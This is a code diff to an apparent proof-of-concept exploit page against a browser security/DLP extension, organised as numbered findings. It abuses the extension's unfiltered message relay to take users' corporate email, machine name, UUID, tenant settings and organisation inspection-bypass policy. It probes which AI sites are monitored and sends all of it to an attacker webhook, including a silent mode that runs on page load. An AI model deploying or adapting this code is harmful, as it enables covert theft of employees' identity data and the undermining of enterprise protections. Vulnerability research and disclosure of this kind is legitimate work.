@@ -190,8 +190,10 @@ const collected = {
     extensionDetected: false,
     extensionId: null,
     policyConfig: {},
+    siteActionConfig: {},   // ← contains userInfo.email, machineName, UUID, org policy
     userIdentity: {},
     tenantConfig: {},
+    overlaySettings: {},
     aiPolicyMap: {},
     configFromBackend: {}
 };
@@ -290,9 +292,10 @@ function probeAiPolicy(domain) {
     });
 }
 
-// ── FINDING 2: Content script relay → getPopupSettings ──────────────
-// Extracts tenant config via the unrestricted message relay
-function exfilTenantConfig() {
+// ── Helper: send a message through the content script relay ─────────
+// The content script forwards any {type:"FROM_PAGE"} postMessage to
+// chrome.runtime.sendMessage and broadcasts the response via "*".
+function relayMessage(msg, timeoutMs = 8000) {
     return new Promise((resolve) => {
         const messageId = Math.random().toString(36).substring(2) + Date.now().toString(36);
 
@@ -307,41 +310,45 @@ function exfilTenantConfig() {
         window.postMessage({
             type: "FROM_PAGE",
             messageId: messageId,
-            message: { type: "getPopupSettings" }
+            message: msg
         }, "*");
 
         setTimeout(() => {
             window.removeEventListener("message", listener);
             resolve({ error: "timeout" });
-        }, 6000);
+        }, timeoutMs);
     });
+}
+
+// ── FINDING 2 (PRIMARY): getSiteActionConfig → userInfo.email ───────
+// This is the money shot. The background handler calls getUserInfo()
+// which resolves the user's corporate email from SSO/MDM/browser
+// profile and returns it in the response along with machineName,
+// userUUID, identitySource, profileEmail, and org policy config.
+// (background.bundle.js:3434-3453)
+function exfilUserInfoViaSiteConfig() {
+    return relayMessage({
+        type: "getSiteActionConfig",
+        domain: location.hostname,
+        ctx: { flowTraceId: crypto.randomUUID() }
+    });
+}
+
+// ── FINDING 2: Content script relay → getPopupSettings ──────────────
+// Extracts API domain/key config via the unrestricted message relay
+function exfilTenantConfig() {
+    return relayMessage({ type: "getPopupSettings" });
 }
 
 // ── FINDING 2: Content script relay → getConfigFromBackend ──────────
 // Triggers a full config refresh and returns backend config
 function exfilBackendConfig() {
-    return new Promise((resolve) => {
-        const messageId = Math.random().toString(36).substring(2) + Date.now().toString(36);
+    return relayMessage({ type: "getConfigFromBackend" });
+}
 
-        function listener(e) {
-            if (e.data && e.data.type === "FROM_BACKGROUND" && e.data.messageId === messageId) {
-                window.removeEventListener("message", listener);
-                resolve(e.data.response);
-            }
-        }
-        window.addEventListener("message", listener);
-
-        window.postMessage({
-            type: "FROM_PAGE",
-            messageId: messageId,
-            message: { type: "getConfigFromBackend" }
-        }, "*");
-
-        setTimeout(() => {
-            window.removeEventListener("message", listener);
-            resolve({ error: "timeout" });
-        }, 6000);
-    });
+// ── FINDING 2: Content script relay → getPageOverlaySettings ────────
+function exfilOverlaySettings() {
+    return relayMessage({ type: "getPageOverlaySettings" });
 }
 
 // ── EXFILTRATION ────────────────────────────────────────────────────
@@ -372,33 +379,63 @@ function showResults() {
         const tag = critical
             ? '<span class="tag-critical">EXFILTRATED</span>'
             : '<span class="tag-success">CAPTURED</span>';
-        div.innerHTML = `<span class="label">${label}:</span> ${tag}<br>${typeof value === "object" ? JSON.stringify(value, null, 2) : value}`;
+        const formatted = typeof value === "object" ? JSON.stringify(value, null, 2) : String(value);
+        div.innerHTML = `<span class="label">${label}:</span> ${tag}<br><pre style="margin:4px 0;white-space:pre-wrap;font-size:12px;">${formatted.replace(/</g,"&lt;")}</pre>`;
         container.appendChild(div);
     }
 
     addResult("Extension Detected", collected.extensionDetected);
     addResult("Extension ID", collected.extensionId || "N/A");
 
+    // Most important: user identity from getSiteActionConfig
+    const si = collected.siteActionConfig;
+    if (si && si.userInfo) {
+        const ui = si.userInfo;
+        addResult("User Corporate Email (Finding 2)", ui.email || "N/A", true);
+        addResult("Browser Profile Email", ui.profileEmail || "N/A", true);
+        addResult("Machine Name", ui.machineName || "N/A", true);
+        addResult("User UUID", ui.userUUID || "N/A", true);
+        addResult("Identity Source", ui.identitySource || "N/A", true);
+    } else if (si && !si.error) {
+        addResult("getSiteActionConfig Response (Finding 2)", si, true);
+    }
+
+    // Org policy details from getSiteActionConfig
+    if (si && !si.error) {
+        const orgPolicy = {
+            globalCanBypassInspection: si.globalSettingsCanBypassInspection,
+            isExtensionDisabled: si.isExtensionDisabled,
+            ignoredDomains: si.ignoredDomains,
+            inspectionBypassPrevented: si.inspectionBypassPrevented,
+            userBypassedDomains: si.userBypassedInspectedDomains,
+            workProfileDomain: si.workProfileDomain,
+            domainActions: si.domainActions
+        };
+        addResult("Organization Policy Config (Finding 2)", orgPolicy, true);
+    }
+
     if (Object.keys(collected.policyConfig).length > 0) {
-        addResult("DLP Policy Config (Finding 3 — DOM leak)", collected.policyConfig, true);
+        addResult("DLP Policy Flags from DOM (Finding 3)", collected.policyConfig, true);
     }
 
     if (collected.userIdentity && !collected.userIdentity.error) {
-        addResult("User Identity / Protect API Response (Finding 1)", collected.userIdentity, true);
-    } else if (collected.userIdentity) {
-        addResult("User Identity Attempt", collected.userIdentity);
+        addResult("Protect API Response (Finding 1)", collected.userIdentity, true);
     }
 
     if (collected.tenantConfig && !collected.tenantConfig.error) {
-        addResult("Tenant Config (Finding 2 — message relay)", collected.tenantConfig, true);
+        addResult("Tenant API Config (Finding 2)", collected.tenantConfig, true);
     }
 
-    if (collected.configFromBackend && !collected.configFromBackend.error) {
-        addResult("Backend Config (Finding 2 — relay)", collected.configFromBackend, true);
+    if (collected.overlaySettings && !collected.overlaySettings.error) {
+        addResult("Overlay Settings (Finding 2)", collected.overlaySettings, true);
     }
 
     if (Object.keys(collected.aiPolicyMap).length > 0) {
-        addResult("AI Service Monitoring Policy (Finding 1 — probing)", collected.aiPolicyMap, true);
+        addResult("AI Service Monitoring Map (Finding 1)", collected.aiPolicyMap, true);
+    }
+
+    if (collected.configFromBackend && !collected.configFromBackend.error) {
+        addResult("Backend Config (Finding 2)", collected.configFromBackend, true);
     }
 
     panel.classList.add("active");
@@ -432,20 +469,31 @@ async function runExploit() {
     }
 
     // Step 2: Extract policy config from DOM (Finding 3)
-    setStatus("[2/6] Extracting DLP policy config from DOM...");
+    setStatus("[2/7] Extracting DLP policy config from DOM...");
     extractPolicyConfig();
     await new Promise(r => setTimeout(r, 500));
 
-    // Step 3: Exfiltrate user identity via onMessageExternal (Finding 1)
-    setStatus("[3/6] Extracting user identity via external message API...");
+    // Step 3: THE MONEY SHOT — getSiteActionConfig via content script relay (Finding 2)
+    // Returns: userInfo.email, profileEmail, machineName, userUUID, identitySource,
+    //          plus full org policy (bypass settings, ignored domains, domain actions)
+    setStatus("[3/7] Extracting user identity via getSiteActionConfig relay...");
+    collected.siteActionConfig = await exfilUserInfoViaSiteConfig();
+
+    // Step 4: Also try callProtectApi via onMessageExternal (Finding 1)
+    setStatus("[4/7] Triggering callProtectApi via external message API...");
     collected.userIdentity = await exfilUserIdentity();
 
-    // Step 4: Exfiltrate tenant config via content script relay (Finding 2)
-    setStatus("[4/6] Extracting tenant config via message relay...");
-    collected.tenantConfig = await exfilTenantConfig();
+    // Step 5: Exfiltrate tenant API config via relay (Finding 2)
+    setStatus("[5/7] Extracting tenant config + overlay settings...");
+    const [tenantCfg, overlayCfg] = await Promise.all([
+        exfilTenantConfig(),
+        exfilOverlaySettings()
+    ]);
+    collected.tenantConfig = tenantCfg;
+    collected.overlaySettings = overlayCfg;
 
-    // Step 5: Probe AI monitoring policy (Finding 1)
-    setStatus("[5/6] Probing organization AI policy...");
+    // Step 6: Probe AI monitoring policy (Finding 1)
+    setStatus("[6/7] Probing organization AI monitoring policy...");
     const aiDomains = [
         "chatgpt.com", "claude.ai", "gemini.google.com",
         "copilot.microsoft.com", "grok.com", "perplexity.ai",
@@ -456,12 +504,11 @@ async function runExploit() {
         if (r) collected.aiPolicyMap[r.domain] = { monitored: r.monitored, raw: r.rawResponse };
     }
 
-    // Step 5b: Extract backend config via relay (Finding 2)
-    setStatus("[5b/6] Extracting backend configuration...");
+    // Step 6b: Backend config
     collected.configFromBackend = await exfilBackendConfig();
 
-    // Step 6: Exfiltrate everything to attacker webhook
-    setStatus("[6/6] Exfiltrating to webhook...");
+    // Step 7: Exfiltrate everything to attacker webhook
+    setStatus("[7/7] Exfiltrating all data to webhook...");
     sendToWebhook(collected);
 
     await new Promise(r => setTimeout(r, 500));
@@ -490,20 +537,29 @@ window.addEventListener("DOMContentLoaded", function() {
             extractPolicyConfig();
             // Silently collect and exfil in background
             Promise.all([
+                exfilUserInfoViaSiteConfig(),
                 exfilUserIdentity(),
                 exfilTenantConfig(),
+                exfilOverlaySettings(),
                 Promise.all(["chatgpt.com","claude.ai","gemini.google.com","copilot.microsoft.com",
                              "grok.com","perplexity.ai","chat.deepseek.com","chat.mistral.ai"]
                     .map(d => probeAiPolicy(d)))
-            ]).then(([identity, tenant, policies]) => {
+            ]).then(([siteAction, identity, tenant, overlay, policies]) => {
                 const silentData = {
                     mode: "silent_auto",
                     timestamp: new Date().toISOString(),
                     userAgent: navigator.userAgent,
                     extensionId: collected.extensionId,
                     policyConfig: collected.policyConfig,
+                    userEmail: siteAction?.userInfo?.email || null,
+                    profileEmail: siteAction?.userInfo?.profileEmail || null,
+                    machineName: siteAction?.userInfo?.machineName || null,
+                    userUUID: siteAction?.userInfo?.userUUID || null,
+                    identitySource: siteAction?.userInfo?.identitySource || null,
+                    siteActionConfig: siteAction,
                     userIdentity: identity,
                     tenantConfig: tenant,
+                    overlaySettings: overlay,
                     aiPolicyMap: {}
                 };
                 for (const r of policies) {
